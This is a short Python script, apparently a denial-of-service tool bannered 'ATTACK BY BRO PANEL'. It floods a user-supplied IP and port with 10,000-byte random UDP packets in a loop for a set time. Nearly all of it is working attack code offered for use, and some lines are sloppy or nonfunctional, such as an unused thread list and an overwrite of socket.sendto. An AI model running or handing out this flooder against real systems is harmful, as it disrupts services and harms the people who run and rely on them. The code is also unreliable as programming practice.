import socket
import concurrent.futures
import os
import random
import sys
import time

def banner():
    print("""ATTACK BY BRO PANEL""")



threads = [95500]

banner()
if len(sys.argv) !=4:
    print(f"Use: python3 {sys.argv[0]} <ip> <port> <time>")
    sys.exit(1)
    
target=sys.argv[1]
port=sys.argv[2]
timer = int(sys.argv[3])

#create socket, packet
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 

victim_ip = target 
attack_port = int(port)

sent = 0 
standard_time = time.time()
print (f'Attack Started To: {target}:{port} Time: {timer}')
standard_time = time.time()

#def run():
payload = os.urandom(10000)
socket.sendto = os.urandom(10000)
packet = random.randint(1024, 8192)
 
while True: 
    end = time.time()
            
    if(end - standard_time < timer):
        sock.sendto(payload, (victim_ip, attack_port))
        sent = sent + 1
    else:
        exit()